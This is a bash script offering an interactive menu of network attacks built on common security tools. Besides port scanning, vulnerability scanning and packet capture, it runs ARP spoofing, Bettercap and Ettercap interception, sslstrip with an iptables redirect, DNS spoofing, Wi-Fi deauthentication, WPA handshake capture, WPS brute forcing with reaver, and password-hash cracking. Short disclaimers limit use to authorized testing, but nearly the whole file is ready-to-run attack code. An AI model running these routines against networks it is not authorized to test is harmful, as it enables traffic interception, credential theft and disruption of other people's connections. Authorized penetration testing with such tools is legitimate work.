#!/bin/bash

# Advanced Network Security Tool Script
# For authorized testing on networks you own or have permission to test

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Function to display header
header() {
    clear
    echo -e "${BLUE}==================================================${NC}"
    echo -e "${BLUE}        Advanced Network Security Testing Tool    ${NC}"
    echo -e "${BLUE}==================================================${NC}"
    echo -e "${YELLOW}Use only on networks you own or have permission to test${NC}"
    echo -e "${YELLOW}Unauthorized access to computer systems is illegal${NC}"
    echo ""
}

# Function to check if tool is installed
check_tool() {
    if ! command -v $1 &> /dev/null; then
        echo -e "${RED}$1 is not installed.${NC}"
        echo "Would you like to install it? (y/n)"
        read -r install_choice
        if [[ $install_choice == "y" || $install_choice == "Y" ]]; then
            sudo apt-get install $2 -y
        else
            return 1
        fi
    fi
    return 0
}

# Function to get target information
get_target() {
    echo -e "${GREEN}Enter target IP, hostname, or network range:${NC}"
    read -r target
    echo -e "${GREEN}Enter port(s) (default: common ports):${NC}"
    read -r ports
    if [[ -z "$ports" ]]; then
        ports="21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080"
    fi
}

# Function to get network interface
get_interface() {
    echo -e "${GREEN}Enter network interface (e.g., eth0, wlan0):${NC}"
    read -r interface
}

# Function to get wireless interface in monitor mode
get_monitor_interface() {
    echo -e "${GREEN}Enter wireless interface (e.g., wlan0):${NC}"
    read -r wifi_interface
    
    echo -e "${YELLOW}Putting interface in monitor mode...${NC}"
    sudo airmon-ng check kill
    sudo airmon-ng start $wifi_interface
    monitor_interface="${wifi_interface}mon"
    echo -e "${GREEN}Monitor interface: $monitor_interface${NC}"
}

# MITM Attack function with multiple tools
mitm_attack() {
    header
    echo -e "${GREEN}MITM Attack Options${NC}"
    echo "1. ARP Spoofing (arpspoof)"
    echo "2. Bettercap (comprehensive MITM)"
    echo "3. Ettercap (GUI and CLI options)"
    echo "4. SSL Stripping (sslstrip)"
    echo "5. Return to main menu"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    case $option in
        1)
            echo -e "${YELLOW}ARP Spoofing with arpspoof${NC}"
            check_tool "arpspoof" "dsniff"
            if [ $? -eq 1 ]; then return; fi
            
            get_interface
            echo -e "${GREEN}Enter target IP:${NC}"
            read -r target_ip
            echo -e "${GREEN}Enter gateway IP:${NC}"
            read -r gateway_ip
            
            echo -e "${YELLOW}Enabling IP forwarding...${NC}"
            sudo sysctl -w net.ipv4.ip_forward=1
            
            echo -e "${YELLOW}Starting ARP spoofing between $target_ip and $gateway_ip${NC}"
            echo -e "${YELLOW}Running: sudo arpspoof -i $interface -t $target_ip $gateway_ip${NC}"
            sudo arpspoof -i $interface -t $target_ip $gateway_ip &
            arpspoof_pid1=$!
            
            echo -e "${YELLOW}Running: sudo arpspoof -i $interface -t $gateway_ip $target_ip${NC}"
            sudo arpspoof -i $interface -t $gateway_ip $target_ip &
            arpspoof_pid2=$!
            
            echo -e "${GREEN}ARP spoofing running. Press any key to stop...${NC}"
            read -n 1 -s
            sudo kill $arpspoof_pid1 $arpspoof_pid2 2>/dev/null
            echo -e "${YELLOW}ARP spoofing stopped${NC}"
            ;;
        2)
            echo -e "${YELLOW}Comprehensive MITM with Bettercap${NC}"
            check_tool "bettercap" "bettercap"
            if [ $? -eq 1 ]; then return; fi
            
            get_interface
            echo -e "${YELLOW}Starting Bettercap on interface $interface${NC}"
            echo -e "${YELLOW}Running: sudo bettercap -iface $interface${NC}"
            sudo bettercap -iface $interface
            ;;
        3)
            echo -e "${YELLOW}MITM with Ettercap${NC}"
            check_tool "ettercap" "ettercap-graphical"
            if [ $? -eq 1 ]; then return; fi
            
            get_interface
            echo -e "${GREEN}Choose Ettercap mode:${NC}"
            echo "1. Text mode"
            echo "2. Graphical mode"
            echo "3. Curses mode"
            read -r ettercap_mode
            
            case $ettercap_mode in
                1)
                    sudo ettercap -T -i $interface
                    ;;
                2)
                    sudo ettercap -G -i $interface
                    ;;
                3)
                    sudo ettercap -C -i $interface
                    ;;
                *)
                    echo -e "${RED}Invalid option${NC}"
                    ;;
            esac
            ;;
        4)
            echo -e "${YELLOW}SSL Stripping with sslstrip${NC}"
            check_tool "sslstrip" "sslstrip"
            if [ $? -eq 1 ]; then return; fi
            
            get_interface
            echo -e "${GREEN}Enter port to redirect (default: 8080):${NC}"
            read -r sslstrip_port
            if [[ -z "$sslstrip_port" ]]; then
                sslstrip_port=8080
            fi
            
            echo -e "${YELLOW}Setting up iptables rules...${NC}"
            sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port $sslstrip_port
            
            echo -e "${YELLOW}Starting sslstrip on port $sslstrip_port${NC}"
            sudo sslstrip -l $sslstrip_port -w sslstrip_log.txt &
            sslstrip_pid=$!
            
            echo -e "${GREEN}SSL stripping running. Press any key to stop...${NC}"
            read -n 1 -s
            sudo kill $sslstrip_pid 2>/dev/null
            sudo iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port $sslstrip_port
            echo -e "${YELLOW}SSL stripping stopped${NC}"
            ;;
        5)
            return
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
}

# DNS Spoofing function with multiple tools
dns_spoof() {
    header
    echo -e "${GREEN}DNS Spoofing Options${NC}"
    echo "1. DNSchef (Python-based)"
    echo "2. Ettercap DNS spoofing"
    echo "3. Return to main menu"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    case $option in
        1)
            echo -e "${YELLOW}DNS Spoofing with DNSchef${NC}"
            check_tool "dnschef" "dnschef"
            if [ $? -eq 1 ]; then return; fi
            
            get_interface
            echo -e "${GREEN}Enter IP address to redirect requests to:${NC}"
            read -r redirect_ip
            echo -e "${GREEN}Enter domain to spoof (leave empty for all domains):${NC}"
            read -r spoof_domain
            
            local_ip=$(ip addr show $interface | grep "inet " | awk '{print $2}' | cut -d/ -f1)
            
            if [[ -z "$spoof_domain" ]]; then
                echo -e "${YELLOW}Redirecting all domains to $redirect_ip${NC}"
                sudo dnschef -i $redirect_ip --interface $local_ip &
            else
                echo -e "${YELLOW}Redirecting $spoof_domain to $redirect_ip${NC}"
                sudo dnschef --fakedomains=$spoof_domain=$redirect_ip --interface $local_ip &
            fi
            
            dnschef_pid=$!
            
            echo -e "${GREEN}DNS spoofing running. Press any key to stop...${NC}"
            read -n 1 -s
            sudo kill $dnschef_pid 2>/dev/null
            echo -e "${YELLOW}DNS spoofing stopped${NC}"
            ;;
        2)
            echo -e "${YELLOW}DNS Spoofing with Ettercap${NC}"
            check_tool "ettercap" "ettercap-graphical"
            if [ $? -eq 1 ]; then return; fi
            
            echo -e "${YELLOW}Create a DNS spoof configuration file first${NC}"
            echo -e "${GREEN}Enter domain to spoof:${NC}"
            read -r spoof_domain
            echo -e "${GREEN}Enter IP address to redirect to:${NC}"
            read -r redirect_ip
            
            echo "$spoof_domain A $redirect_ip" > etter.dns
            echo -e "${YELLOW}Created etter.dns file with spoofing rule${NC}"
            
            get_interface
            echo -e "${YELLOW}Starting Ettercap for DNS spoofing${NC}"
            sudo ettercap -T -i $interface -P dns_spoof // //
            ;;
        3)
            return
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
}

# Wireless client kicking function with multiple tools
wireless_kick() {
    header
    echo -e "${GREEN}Wireless Attack Options${NC}"
    echo "1. Deauthentication attack (aireplay-ng)"
    echo "2. MDK4 deauthentication"
    echo "3. WPA/WPA2 handshake capture"
    echo "4. WPS attack (reaver)"
    echo "5. Return to main menu"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    case $option in
        1)
            echo -e "${YELLOW}Deauthentication attack with aireplay-ng${NC}"
            check_tool "aireplay-ng" "aircrack-ng"
            if [ $? -eq 1 ]; then return; fi
            
            get_monitor_interface
            echo -e "${GREEN}Enter target BSSID:${NC}"
            read -r bssid
            echo -e "${GREEN}Enter target client MAC (leave empty for all clients):${NC}"
            read -r client_mac
            echo -e "${GREEN}Enter number of deauth packets to send (0 for continuous):${NC}"
            read -r deauth_count
            
            if [[ -z "$deauth_count" || $deauth_count -eq 0 ]]; then
                deauth_count=0
            fi
            
            if [[ -z "$client_mac" ]]; then
                echo -e "${YELLOW}Running: sudo aireplay-ng --deauth $deauth_count -a $bssid $monitor_interface${NC}"
                sudo aireplay-ng --deauth $deauth_count -a $bssid $monitor_interface
            else
                echo -e "${YELLOW}Running: sudo aireplay-ng --deauth $deauth_count -a $bssid -c $client_mac $monitor_interface${NC}"
                sudo aireplay-ng --deauth $deauth_count -a $bssid -c $client_mac $monitor_interface
            fi
            ;;
        2)
            echo -e "${YELLOW}Deauthentication attack with MDK4${NC}"
            check_tool "mdk4" "mdk4"
            if [ $? -eq 1 ]; then return; fi
            
            get_monitor_interface
            echo -e "${GREEN}Enter target BSSID:${NC}"
            read -r bssid
            
            echo -e "${YELLOW}Running: sudo mdk4 $monitor_interface d -b $bssid${NC}"
            sudo mdk4 $monitor_interface d -b $bssid
            ;;
        3)
            echo -e "${YELLOW}WPA/WPA2 Handshake Capture${NC}"
            check_tool "airodump-ng" "aircrack-ng"
            if [ $? -eq 1 ]; then return; fi
            
            get_monitor_interface
            echo -e "${GREEN}Enter target BSSID:${NC}"
            read -r bssid
            echo -e "${GREEN}Enter channel:${NC}"
            read -r channel
            echo -e "${GREEN}Enter output file name:${NC}"
            read -r output_file
            
            echo -e "${YELLOW}Starting capture on channel $channel${NC}"
            sudo airodump-ng -c $channel --bssid $bssid -w $output_file $monitor_interface
            
            echo -e "${YELLOW}Now run a deauth attack to capture the handshake${NC}"
            ;;
        4)
            echo -e "${YELLOW}WPS Attack with Reaver${NC}"
            check_tool "reaver" "reaver"
            if [ $? -eq 1 ]; then return; fi
            
            get_monitor_interface
            echo -e "${GREEN}Enter target BSSID:${NC}"
            read -r bssid
            echo -e "${GREEN}Enter channel:${NC}"
            read -r channel
            
            echo -e "${YELLOW}Running: sudo reaver -i $monitor_interface -b $bssid -c $channel -vv${NC}"
            sudo reaver -i $monitor_interface -b $bssid -c $channel -vv
            ;;
        5)
            return
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
}

# Network sniffing function with multiple tools
network_sniff() {
    header
    echo -e "${GREEN}Network Sniffing Options${NC}"
    echo "1. Basic packet capture (tcpdump)"
    echo "2. Advanced packet analysis (tshark)"
    echo "3. GUI packet analysis (Wireshark)"
    echo "4. Analyze captured data"
    echo "5. Return to main menu"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    case $option in
        1)
            echo -e "${YELLOW}Packet capture with tcpdump${NC}"
            check_tool "tcpdump" "tcpdump"
            get_interface
            echo -e "${GREEN}Enter output file name:${NC}"
            read -r output_file
            echo -e "${YELLOW}Running: sudo tcpdump -i $interface -w $output_file.pcap${NC}"
            sudo tcpdump -i $interface -w $output_file.pcap
            ;;
        2)
            echo -e "${YELLOW}Packet analysis with tshark${NC}"
            check_tool "tshark" "tshark"
            get_interface
            echo -e "${GREEN}Enter filter (e.g., 'tcp port 80'):${NC}"
            read -r filter
            echo -e "${GREEN}Enter output file name:${NC}"
            read -r output_file
            echo -e "${YELLOW}Running: sudo tshark -i $interface -f '$filter' -w $output_file.pcap${NC}"
            sudo tshark -i $interface -f "$filter" -w $output_file.pcap
            ;;
        3)
            echo -e "${YELLOW}GUI packet analysis with Wireshark${NC}"
            check_tool "wireshark" "wireshark"
            echo -e "${YELLOW}Starting Wireshark GUI...${NC}"
            wireshark
            ;;
        4)
            echo -e "${YELLOW}Analyze captured data${NC}"
            check_tool "tshark" "tshark"
            echo -e "${GREEN}Enter capture file name:${NC}"
            read -r cap_file
            echo -e "${GREEN}Enter filter (e.g., 'http.request'):${NC}"
            read -r filter
            echo -e "${YELLOW}Running: tshark -r $cap_file.pcap -Y '$filter'${NC}"
            tshark -r $cap_file.pcap -Y "$filter"
            ;;
        5)
            return
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
}

# Port scanning function with multiple tools
port_scan() {
    header
    echo -e "${GREEN}Port Scanning Options${NC}"
    echo "1. Quick scan (nmap)"
    echo "2. Comprehensive scan (nmap)"
    echo "3. Stealth scan (nmap)"
    echo "4. Version detection (nmap)"
    echo "5. Masscan (fast scanning)"
    echo "6. Return to main menu"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    get_target
    
    case $option in
        1)
            echo -e "${YELLOW}Quick scan with nmap${NC}"
            check_tool "nmap" "nmap"
            echo -e "${YELLOW}Running: nmap -F $target${NC}"
            nmap -F $target
            ;;
        2)
            echo -e "${YELLOW}Comprehensive scan with nmap${NC}"
            check_tool "nmap" "nmap"
            echo -e "${YELLOW}Running: nmap -sS -sV -sC -O -p $ports $target${NC}"
            nmap -sS -sV -sC -O -p $ports $target
            ;;
        3)
            echo -e "${YELLOW}Stealth scan with nmap${NC}"
            check_tool "nmap" "nmap"
            echo -e "${YELLOW}Running: nmap -sS -T2 -f $target${NC}"
            nmap -sS -T2 -f $target
            ;;
        4)
            echo -e "${YELLOW}Version detection with nmap${NC}"
            check_tool "nmap" "nmap"
            echo -e "${YELLOW}Running: nmap -sV -sC $target${NC}"
            nmap -sV -sC $target
            ;;
        5)
            echo -e "${YELLOW}Fast scanning with masscan${NC}"
            check_tool "masscan" "masscan"
            echo -e "${GREEN}Enter rate (packets/second, default: 1000):${NC}"
            read -r rate
            if [[ -z "$rate" ]]; then
                rate=1000
            fi
            echo -e "${YELLOW}Running: masscan -p$ports --rate=$rate $target${NC}"
            sudo masscan -p$ports --rate=$rate $target
            ;;
        6)
            return
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
}

# Vulnerability assessment function with multiple tools
vuln_assessment() {
    header
    echo -e "${GREEN}Vulnerability Assessment Options${NC}"
    echo "1. Basic vulnerability scan (nmap)"
    echo "2. Web application scan (nikto)"
    echo "3. Web application scan (OWASP ZAP)"
    echo "4. Network service scan (nmap)"
    echo "5. Return to main menu"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    get_target
    
    case $option in
        1)
            echo -e "${YELLOW}Vulnerability scan with nmap${NC}"
            check_tool "nmap" "nmap"
            echo -e "${YELLOW}Running: nmap --script vuln $target${NC}"
            nmap --script vuln $target
            ;;
        2)
            echo -e "${YELLOW}Web application scan with nikto${NC}"
            check_tool "nikto" "nikto"
            echo -e "${GREEN}Enter URL (e.g., http://$target):${NC}"
            read -r url
            echo -e "${YELLOW}Running: nikto -h $url${NC}"
            nikto -h $url
            ;;
        3)
            echo -e "${YELLOW}Web application scan with OWASP ZAP${NC}"
            check_tool "zap-cli" "zap-cli"
            echo -e "${GREEN}Enter URL (e.g., http://$target):${NC}"
            read -r url
            echo -e "${YELLOW}Running: zap-cli quick-scan $url${NC}"
            zap-cli quick-scan $url
            ;;
        4)
            echo -e "${YELLOW}Network service scan with nmap${NC}"
            check_tool "nmap" "nmap"
            echo -e "${YELLOW}Running: nmap -sS -sV --script safe $target${NC}"
            nmap -sS -sV --script safe $target
            ;;
        5)
            return
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
}

# Password attacks function
password_attacks() {
    header
    echo -e "${GREEN}Password Attack Options${NC}"
    echo "1. Hash cracking (John the Ripper)"
    echo "2. Hash cracking (Hashcat)"
    echo "3. Wordlist generation (crunch)"
    echo "4. Return to main menu"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    case $option in
        1)
            echo -e "${YELLOW}Hash cracking with John the Ripper${NC}"
            check_tool "john" "john"
            echo -e "${GREEN}Enter path to hash file:${NC}"
            read -r hash_file
            echo -e "${GREEN}Enter wordlist path (press enter for default):${NC}"
            read -r wordlist
            if [[ -z "$wordlist" ]]; then
                echo -e "${YELLOW}Running: john $hash_file${NC}"
                john $hash_file
            else
                echo -e "${YELLOW}Running: john --wordlist=$wordlist $hash_file${NC}"
                john --wordlist=$wordlist $hash_file
            fi
            ;;
        2)
            echo -e "${YELLOW}Hash cracking with Hashcat${NC}"
            check_tool "hashcat" "hashcat"
            echo -e "${GREEN}Enter path to hash file:${NC}"
            read -r hash_file
            echo -e "${GREEN}Enter wordlist path:${NC}"
            read -r wordlist
            echo -e "${GREEN}Enter hash type (e.g., 0 for MD5, 1000 for NTLM):${NC}"
            read -r hash_type
            echo -e "${YELLOW}Running: hashcat -m $hash_type -a 0 $hash_file $wordlist${NC}"
            hashcat -m $hash_type -a 0 $hash_file $wordlist
            ;;
        3)
            echo -e "${YELLOW}Wordlist generation with crunch${NC}"
            check_tool "crunch" "crunch"
            echo -e "${GREEN}Enter min length:${NC}"
            read -r min_len
            echo -e "${GREEN}Enter max length:${NC}"
            read -r max_len
            echo -e "${GREEN}Enter character set:${NC}"
            read -r charset
            echo -e "${GREEN}Enter output file:${NC}"
            read -r output_file
            echo -e "${YELLOW}Running: crunch $min_len $max_len $charset -o $output_file${NC}"
            crunch $min_len $max_len $charset -o $output_file
            ;;
        4)
            return
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
}

# Main menu
while true; do
    header
    echo -e "${GREEN}Main Menu${NC}"
    echo "1. Network Sniffing"
    echo "2. Port Scanning"
    echo "3. Vulnerability Assessment"
    echo "4. MITM Attacks"
    echo "5. DNS Spoofing"
    echo "6. Wireless Attacks"
    echo "7. Password Attacks"
    echo "8. Exit"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    case $option in
        1)
            network_sniff
            ;;
        2)
            port_scan
            ;;
        3)
            vuln_assessment
            ;;
        4)
            mitm_attack
            ;;
        5)
            dns_spoof
            ;;
        6)
            wireless_kick
            ;;
        7)
            password_attacks
            ;;
        8)
            echo -e "${YELLOW}Exiting. Remember to always practice ethical security testing!${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
    
    echo -e "${GREEN}Press any key to continue...${NC}"
    read -n 1 -s
done
